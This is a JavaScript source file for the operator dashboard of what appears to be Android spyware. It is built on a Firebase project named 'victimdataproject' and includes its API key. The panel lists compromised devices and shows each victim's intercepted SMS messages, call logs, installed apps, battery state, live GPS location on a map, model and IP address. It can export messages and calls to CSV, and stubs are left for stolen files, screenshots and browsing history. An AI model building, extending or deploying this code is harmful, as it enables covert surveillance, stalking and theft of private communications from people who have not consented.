// Firebase SDK v9 modular imports
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
import { getDatabase, ref, onValue, off, get } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
// Uncomment if you implement screenshot uploads/downloads from Firebase Storage
// import { getStorage, ref as storageRef, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-storage.js";

// Your Firebase Project Configuration
const firebaseConfig = {
    apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw",
    authDomain: "victimdataproject.firebaseapp.com",
    databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/",
    projectId: "victimdataproject",
    storageBucket: "victimdataproject.appspot.com",
    messagingSenderId: "938788267301",
    appId: "1:938788267301:web:cdcff391160dce48fa66cc"
};

// Initialize Firebase App
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const database = getDatabase(app);
// const storage = getStorage(app); // For screenshots

// --- DOM Elements ---
const loginView = document.getElementById('loginView');
const dashboardView = document.getElementById('dashboardView');
const loginForm = document.getElementById('loginForm');
const loginEmailInput = document.getElementById('loginEmail');
const loginPasswordInput = document.getElementById('loginPassword');
const loginError = document.getElementById('loginError');
const logoutButton = document.getElementById('logoutButton');
const loggedInUserEmail = document.getElementById('loggedInUserEmail');

const deviceListElement = document.getElementById('deviceList');
const deviceSearchInput = document.getElementById('deviceSearch');
const noDevicesMessage = document.getElementById('noDevicesMessage');

const deviceDetailView = document.getElementById('deviceDetailView');
const noDeviceSelectedView = document.getElementById('noDeviceSelectedView');
const selectedDeviceAliasElement = document.getElementById('selectedDeviceAlias');
const selectedDeviceStatusElement = document.getElementById('selectedDeviceStatus');

// Data display elements
const smsListElement = document.getElementById('smsList');
const callListElement = document.getElementById('callList');
const appListElement = document.getElementById('appList');
const batteryInfoElement = document.getElementById('batteryInfo');
const locationInfoElement = document.getElementById('locationInfo');
const fileListElement = document.getElementById('fileList');
const screenshotGalleryElement = document.getElementById('screenshotGallery');
const browsingHistoryListElement = document.getElementById('browsingHistoryList');
const deviceInfoElement = document.getElementById('deviceInfo');

// Empty state elements
const emptyStates = {
    sms: document.getElementById('smsEmptyState'),
    calls: document.getElementById('callsEmptyState'),
    apps: document.getElementById('appsEmptyState'),
    battery: document.getElementById('batteryEmptyState'),
    location: document.getElementById('locationEmptyState'),
    files: document.getElementById('filesEmptyState'),
    screenshots: document.getElementById('screenshotsEmptyState'),
    browsing: document.getElementById('browsingEmptyState'),
    deviceInfo: document.getElementById('deviceInfoEmptyState')
};

const loadingOverlay = document.getElementById('loadingOverlay');

let currentSelectedUID = null;
let activeDataListeners = {}; // To store { uid: { pathKey: unsubscribeFunction } }
let leafletMap = null;

// --- Utility Functions ---
function showLoading() { loadingOverlay.style.display = 'flex'; }
function hideLoading() { loadingOverlay.style.display = 'none'; }

function formatDate(timestamp) {
    if (!timestamp || timestamp === 0) return 'N/A';
    try {
        return new Date(timestamp).toLocaleString('en-US', { 
            year: 'numeric', month: 'short', day: 'numeric', 
            hour: 'numeric', minute: '2-digit', hour12: true 
        });
    } catch (e) {
        return 'Invalid Date';
    }
}

function sanitizeHTML(text) {
    const temp = document.createElement('div');
    temp.textContent = text;
    return temp.innerHTML;
}


// --- Auth Functions ---
loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    showLoading();
    const email = loginEmailInput.value;
    const password = loginPasswordInput.value;
    loginError.textContent = '';

    signInWithEmailAndPassword(auth, email, password)
        .then((userCredential) => { /* onAuthStateChanged handles UI */ })
        .catch((error) => { loginError.textContent = "Login Failed: " + error.message; })
        .finally(() => { hideLoading(); });
});

logoutButton.addEventListener('click', () => {
    signOut(auth).catch(error => console.error("Logout error:", error));
});

onAuthStateChanged(auth, (user) => {
    if (user) {
        loginView.style.display = 'none';
        dashboardView.style.display = 'block';
        loggedInUserEmail.textContent = user.email;
        loadDeviceList();
        showView(noDeviceSelectedView); // Show 'select device' message initially
    } else {
        loginView.style.display = 'block';
        dashboardView.style.display = 'none';
        cleanupAllListeners();
        currentSelectedUID = null;
    }
});

// --- View Management ---
function showView(viewToShow) {
    deviceDetailView.style.display = 'none';
    noDeviceSelectedView.style.display = 'none';
    if (viewToShow) viewToShow.style.display = 'block';
}


// --- Device List Functions ---
function loadDeviceList() {
    showLoading();
    const devicesRef = ref(database, 'devices');
    
    // Detach previous listener if any for device list itself
    if (activeDataListeners['deviceListListener'] && typeof activeDataListeners['deviceListListener'].offFunc === 'function') {
        activeDataListeners['deviceListListener'].offFunc();
    }

    const unsubscribe = onValue(devicesRef, (snapshot) => {
        deviceListElement.innerHTML = '';
        if (snapshot.exists() && snapshot.hasChildren()) {
            noDevicesMessage.style.display = 'none';
            snapshot.forEach((childSnapshot) => {
                const uid = childSnapshot.key;
                const deviceData = childSnapshot.val() || {};
                const alias = deviceData.alias || uid.substring(0, 10) + '...';
                const status = deviceData.status || 'offline';
                const lastSeen = deviceData.lastSeen ? formatDate(deviceData.lastSeen) : 'N/A';

                const deviceItem = document.createElement('a');
                deviceItem.href = '#';
                deviceItem.className = `list-group-item list-group-item-action d-flex justify-content-between align-items-center ${uid === currentSelectedUID ? 'active' : ''}`;
                deviceItem.setAttribute('data-uid', uid);
                deviceItem.innerHTML = `
                    <div class="me-auto">
                        <h6 class="mb-0 device-alias"><i class="fas fa-mobile-alt me-2"></i>${sanitizeHTML(alias)}</h6>
                        <small class="text-muted device-lastseen">Last seen: ${lastSeen}</small>
                    </div>
                    <small class="device-status status-${status.toLowerCase()}"><i class="fas fa-circle fa-xs me-1"></i>${status}</small>
                `;
                deviceItem.addEventListener('click', (e) => {
                    e.preventDefault();
                    document.querySelectorAll('#deviceList .list-group-item.active').forEach(el => el.classList.remove('active'));
                    deviceItem.classList.add('active');
                    displayDeviceDetails(uid, deviceData.alias || uid);
                });
                deviceListElement.appendChild(deviceItem);
            });
        } else {
            noDevicesMessage.style.display = 'block';
        }
        hideLoading();
    }, (error) => {
        console.error("Error loading device list:", error);
        deviceListElement.innerHTML = `<div class="list-group-item text-danger">Error loading devices: ${error.message}</div>`;
        hideLoading();
    });
    activeDataListeners['deviceListListener'] = { offFunc: unsubscribe, path: 'devices' };
}

deviceSearchInput.addEventListener('keyup', () => {
    // ... (search logic - same as before) ...
    const filter = deviceSearchInput.value.toLowerCase();
    const items = deviceListElement.getElementsByTagName('a');
    for (let i = 0; i < items.length; i++) {
        const aliasElement = items[i].querySelector('.device-alias');
        const uid = items[i].getAttribute('data-uid');
        const textToSearch = ((aliasElement ? aliasElement.textContent : '') + uid).toLowerCase();
        if (textToSearch.includes(filter)) {
            items[i].style.display = "flex"; // Use flex for d-flex
        } else {
            items[i].style.display = "none";
        }
    }
});

// --- Device Detail Functions ---
function displayDeviceDetails(uid, alias) {
    if (currentSelectedUID === uid && deviceDetailView.style.display !== 'none') return; // Avoid re-rendering if same device

    cleanupListenersForUID(currentSelectedUID); // Clean up listeners for the PREVIOUSLY selected device
    currentSelectedUID = uid;

    selectedDeviceAliasElement.textContent = sanitizeHTML(alias || uid);
    showView(deviceDetailView);

    const firstTabButton = document.querySelector('#pills-tab button');
    if (firstTabButton) new bootstrap.Tab(firstTabButton).show();
    
    // Initial status from device list data (will be updated by live listener)
    const deviceNode = deviceListElement.querySelector(`[data-uid="${uid}"] .device-status`);
    if(deviceNode) {
        selectedDeviceStatusElement.innerHTML = deviceNode.innerHTML;
        selectedDeviceStatusElement.className = deviceNode.className + " fw-bold";
    } else {
        selectedDeviceStatusElement.textContent = 'N/A';
        selectedDeviceStatusElement.className = 'fw-bold';
    }

    loadDeviceStatus(uid);
    loadSMSLogs(uid);
    loadCallLogs(uid);
    loadInstalledApps(uid);
    loadBatteryInfo(uid);
    loadGPSLocation(uid);
    loadDeviceInfo(uid);
    loadFileLogs(uid); // Implement these
    loadScreenshots(uid); // Implement these
    loadBrowsingHistory(uid); // Implement these
}

function cleanupListenersForUID(uid) {
    if (uid && activeDataListeners[uid]) {
        Object.values(activeDataListeners[uid]).forEach(listenerConfig => {
            if (listenerConfig && typeof listenerConfig.offFunc === 'function') {
                listenerConfig.offFunc();
            }
        });
        delete activeDataListeners[uid];
    }
}

function cleanupAllListeners() {
    Object.keys(activeDataListeners).forEach(key => {
        if (key === 'deviceListListener') { // Handle device list listener separately
            if (activeDataListeners[key] && typeof activeDataListeners[key].offFunc === 'function') {
                activeDataListeners[key].offFunc();
            }
        } else { // UID-specific listeners
            cleanupListenersForUID(key);
        }
    });
    activeDataListeners = {};
}

function setupListener(uid, dataPath, callbackFn, dataKey, listElement, emptyStateElement) {
    if (!activeDataListeners[uid]) activeDataListeners[uid] = {};
    
    const fullPath = `devices/${uid}/${dataPath}`;
    if (activeDataListeners[uid][dataKey] && typeof activeDataListeners[uid][dataKey].offFunc === 'function') {
        activeDataListeners[uid][dataKey].offFunc(); // Detach old listener for this specific data
    }
    if (listElement) listElement.innerHTML = '<div class="text-center mt-3"><div class="spinner-border spinner-border-sm text-primary" role="status"></div></div>';
    if (emptyStateElement) emptyStateElement.style.display = 'none';

    const dataRef = ref(database, fullPath);
    const unsubscribe = onValue(dataRef, callbackFn, (error) => {
        console.error(`Error listening to ${fullPath}:`, error);
        if (listElement) listElement.innerHTML = `<div class="list-group-item text-danger">Error loading ${dataKey}.</div>`;
        if (emptyStateElement) emptyStateElement.style.display = 'block';
    });
    activeDataListeners[uid][dataKey] = { offFunc: unsubscribe, path: fullPath };
}

function loadDeviceStatus(uid) {
    setupListener(uid, 'status', (snapshot) => {
        const status = snapshot.val() || 'offline';
        selectedDeviceStatusElement.innerHTML = `<i class="fas fa-circle fa-xs me-1"></i>${status}`;
        selectedDeviceStatusElement.className = `status-${status.toLowerCase()} fw-bold`;
        // Update status in sidebar list as well
        const deviceStatusInList = deviceListElement.querySelector(`a[data-uid="${uid}"] .device-status`);
        if (deviceStatusInList) {
            deviceStatusInList.innerHTML = `<i class="fas fa-circle fa-xs me-1"></i>${status}`;
            deviceStatusInList.className = `device-status status-${status.toLowerCase()}`;
        }
    }, 'statusLive', null, null); // No list/empty elements for this one

    setupListener(uid, 'lastSeen', (snapshot) => {
        const lastSeen = snapshot.val() ? formatDate(snapshot.val()) : 'N/A';
        const deviceLastSeenInList = deviceListElement.querySelector(`a[data-uid="${uid}"] .device-lastseen`);
        if (deviceLastSeenInList) {
            deviceLastSeenInList.textContent = `Last seen: ${lastSeen}`;
        }
    }, 'lastSeenLive', null, null);
}


function loadSMSLogs(uid) {
    setupListener(uid, 'smsLogs', (snapshot) => {
        smsListElement.innerHTML = '';
        if (snapshot.exists() && snapshot.hasChildren()) {
            let items = [];
            snapshot.forEach(child => items.push(child.val()));
            items.sort((a,b) => (b.time || 0) - (a.time || 0)); // Sort newest first
            items.forEach(sms => {
                const item = document.createElement('div');
                item.className = 'list-group-item';
                item.innerHTML = `
                    <p class="mb-1"><strong>From:</strong> ${sanitizeHTML(sms.sender || 'N/A')}</p>
                    <p class="mb-1 message-body">${sanitizeHTML(sms.message || 'N/A')}</p>
                    <small class="text-muted">${formatDate(sms.time)}</small>`;
                smsListElement.appendChild(item);
            });
            emptyStates.sms.style.display = 'none';
        } else {
            emptyStates.sms.style.display = 'block';
        }
    }, 'smsLogs', smsListElement, emptyStates.sms);
}

function loadCallLogs(uid) {
     setupListener(uid, 'callLogs', (snapshot) => {
        callListElement.innerHTML = '';
        if (snapshot.exists() && snapshot.hasChildren()) {
            let items = [];
            snapshot.forEach(child => items.push(child.val()));
            items.sort((a,b) => (b.time || 0) - (a.time || 0)); 
            items.forEach(call => {
                const durationSeconds = call.duration ? (parseInt(call.duration) / 1000).toFixed(0) : 'N/A';
                let icon = 'fa-phone';
                if (call.type === 'incoming') icon = 'fa-phone-arrow-down-left';
                else if (call.type === 'outgoing') icon = 'fa-phone-arrow-up-right';
                else if (call.type === 'missed') icon = 'fa-phone-missed';

                const item = document.createElement('div');
                item.className = 'list-group-item';
                item.innerHTML = `
                    <p class="mb-1"><i class="fas ${icon} me-2 text-primary"></i><strong>${sanitizeHTML(call.type || 'N/A')}:</strong> ${sanitizeHTML(call.number || 'N/A')} 
                    (${durationSeconds}s)</p>
                    <small class="text-muted">${formatDate(call.time)}</small>`;
                callListElement.appendChild(item);
            });
            emptyStates.calls.style.display = 'none';
        } else {
            emptyStates.calls.style.display = 'block';
        }
    }, 'callLogs', callListElement, emptyStates.calls);
}

function loadInstalledApps(uid) {
    setupListener(uid, 'installedApps', (snapshot) => {
        appListElement.innerHTML = '';
        if (snapshot.exists() && snapshot.hasChildren()) {
            snapshot.forEach(child => {
                const app = child.val();
                const item = document.createElement('div');
                item.className = 'list-group-item';
                item.textContent = sanitizeHTML(app.packageName || 'N/A');
                appListElement.appendChild(item);
            });
             emptyStates.apps.style.display = 'none';
        } else {
            emptyStates.apps.style.display = 'block';
        }
    }, 'installedApps', appListElement, emptyStates.apps);
}

function loadBatteryInfo(uid) {
     setupListener(uid, 'battery', (snapshot) => {
        if (snapshot.exists()) {
            const battery = snapshot.val();
            let batteryIcon = 'fa-battery-empty';
            if (battery.level > 90) batteryIcon = 'fa-battery-full';
            else if (battery.level > 70) batteryIcon = 'fa-battery-three-quarters';
            else if (battery.level > 40) batteryIcon = 'fa-battery-half';
            else if (battery.level > 15) batteryIcon = 'fa-battery-quarter';

            batteryInfoElement.innerHTML = `
                <p><i class="fas ${batteryIcon} fa-lg me-2 text-primary"></i> Level: ${battery.level || 'N/A'}%</p>
                <p><i class="fas ${battery.charging ? 'fa-bolt' : 'fa-plug-circle-minus'} fa-lg me-2 text-primary"></i> Charging: ${battery.charging ? 'Yes' : 'No'}</p>`;
            emptyStates.battery.style.display = 'none';
        } else {
            batteryInfoElement.innerHTML = '';
            emptyStates.battery.style.display = 'block';
        }
    }, 'battery', batteryInfoElement, emptyStates.battery);
}

function loadGPSLocation(uid) {
    if (!leafletMap) {
        try {
            leafletMap = L.map('map').setView([20.5937, 78.9629], 4); // Default view
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                maxZoom: 19,
                attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
            }).addTo(leafletMap);
        } catch(e) { console.error("Error initializing map:", e); locationEmptyState.style.display = 'block'; return; }
    }
    
    setupListener(uid, 'location', (snapshot) => {
        locationInfoElement.innerHTML = '';
        if (snapshot.exists()) {
            const loc = snapshot.val();
            if (loc.lat && loc.lng) {
                locationInfoElement.innerHTML = `
                    <p><strong>Latitude:</strong> ${loc.lat.toFixed(6)}</p>
                    <p><strong>Longitude:</strong> ${loc.lng.toFixed(6)}</p>
                    <p><strong>Time:</strong> ${formatDate(loc.timestamp)}</p>`;
                
                leafletMap.eachLayer(layer => { if (layer instanceof L.Marker) leafletMap.removeLayer(layer); });
                L.marker([loc.lat, loc.lng]).addTo(leafletMap)
                    .bindPopup(`Location at ${formatDate(loc.timestamp)}`)
                    .openPopup();
                leafletMap.setView([loc.lat, loc.lng], 16);
                 emptyStates.location.style.display = 'none';
            } else {
                 locationInfoElement.innerHTML = '<p>Incomplete location data.</p>';
                 emptyStates.location.style.display = 'none'; // Still hide default empty state
            }
        } else {
            emptyStates.location.style.display = 'block';
        }
    }, 'location', locationInfoElement, emptyStates.location);
}

function loadDeviceInfo(uid) {
    setupListener(uid, 'deviceInfo', (snapshot) => {
        if (snapshot.exists()) {
            const info = snapshot.val();
            deviceInfoElement.innerHTML = `
                <p><strong>Model:</strong> ${sanitizeHTML(info.model || 'N/A')}</p>
                <p><strong>Android Version:</strong> ${sanitizeHTML(info.androidVersion || 'N/A')}</p>
                <p><strong>IP Address:</strong> ${sanitizeHTML(info.ip || 'N/A')}</p>`;
            emptyStates.deviceInfo.style.display = 'none';
        } else {
            deviceInfoElement.innerHTML = '';
            emptyStates.deviceInfo.style.display = 'block';
        }
    }, 'deviceInfo', deviceInfoElement, emptyStates.deviceInfo);
}

// --- Placeholder data loading functions ---
function loadFileLogs(uid) { 
    fileListElement.innerHTML = ''; 
    emptyStates.files.style.display = 'block';
    // TODO: Implement actual listener for devices/<uid>/fileLogs
    console.warn("File Logs not implemented yet for UID:", uid);
}
function loadScreenshots(uid) { 
    screenshotGalleryElement.innerHTML = ''; 
    emptyStates.screenshots.style.display = 'block';
    // TODO: Implement actual listener for devices/<uid>/screenshots
    console.warn("Screenshots not implemented yet for UID:", uid);
}
function loadBrowsingHistory(uid) { 
    browsingHistoryListElement.innerHTML = ''; 
    emptyStates.browsing.style.display = 'block';
    // TODO: Implement actual listener for devices/<uid>/browsingHistory
    console.warn("Browsing History not implemented yet for UID:", uid);
}

// --- Export Functionality ---
document.querySelectorAll('.export-btn').forEach(button => {
    button.addEventListener('click', function() {
        if (!currentSelectedUID) { alert("Please select a device first."); return; }
        const dataType = this.getAttribute('data-type');
        exportData(currentSelectedUID, dataType);
    });
});

async function exportData(uid, type) {
    showLoading();
    const dataPaths = {
        sms: 'smsLogs',
        calls: 'callLogs',
        apps: 'installedApps',
        // Add other types as needed
    };
    const path = dataPaths[type];
    if (!path) { alert("Unknown data type for export."); hideLoading(); return; }

    try {
        const dataRef = ref(database, `devices/${uid}/${path}`);
        const snapshot = await get(dataRef);

        if (snapshot.exists() && snapshot.hasChildren()) {
            let csvContent = "";
            let headers = [];
            const dataArray = [];

            if (type === 'sms') {
                headers = ["Sender", "Message", "Time"];
                snapshot.forEach(child => {
                    const sms = child.val();
                    dataArray.push([
                        `"${(sms.sender || '').replace(/"/g, '""')}"`, 
                        `"${(sms.message || '').replace(/"/g, '""')}"`, 
                        `"${formatDate(sms.time)}"`
                    ]);
                });
            } else if (type === 'calls') {
                headers = ["Type", "Number", "Duration (s)", "Time"];
                snapshot.forEach(child => {
                    const call = child.val();
                    dataArray.push([
                        `"${(call.type || '').replace(/"/g, '""')}"`, 
                        `"${(call.number || '').replace(/"/g, '""')}"`, 
                        call.duration ? (parseInt(call.duration) / 1000).toFixed(0) : 'N/A', 
                        `"${formatDate(call.time)}"`
                    ]);
                });
            } // Add more types here...
            
            if (headers.length > 0) {
                 csvContent += headers.join(",") + "\r\n";
                 dataArray.forEach(rowArray => { csvContent += rowArray.join(",") + "\r\n"; });

                const blob = new Blob(["\uFEFF" + csvContent], { type: 'text/csv;charset=utf-8;' }); // BOM for Excel
                const link = document.createElement("a");
                const url = URL.createObjectURL(blob);
                link.setAttribute("href", url);
                link.setAttribute("download", `${uid}_${type}_export.csv`);
                link.style.visibility = 'hidden';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
            } else {
                 alert("No headers defined for this export type.");
            }
        } else {
            alert("No data found for export.");
        }
    } catch (error) {
        console.error("Export error:", error);
        alert("Error exporting data.");
    } finally {
        hideLoading();
    }
}

// Tab shown event listener to re-initialize map if needed or refresh data
document.querySelectorAll('#pills-tab button').forEach(button => {
    button.addEventListener('shown.bs.tab', event => {
        if (event.target.id === 'pills-location-tab' && leafletMap) {
            setTimeout(() => leafletMap.invalidateSize(), 10); // Refresh map size
        }
        // You could also trigger a re-fetch or re-render of data for the shown tab if needed
        // For example, if you only load data when a tab is active for the first time.
        // Our current setup loads all data when a device is selected.
    });
});

console.log("Admin Panel JS Initialized");